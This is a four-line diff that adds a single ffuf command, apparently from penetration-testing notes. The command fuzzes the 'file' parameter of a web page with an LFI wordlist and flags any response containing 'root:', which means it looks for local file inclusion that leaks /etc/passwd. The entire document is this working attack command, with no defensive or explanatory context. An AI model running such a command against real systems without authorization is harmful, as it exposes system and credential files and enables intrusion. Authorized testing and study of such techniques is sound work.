@@ -1,0 +1,4 @@
+ffuf -w LFI-Jhaddix.txt \
+     -u "https://target.com/page?file=FUZZ" \
+     -mr "root:" \
+     -t 30
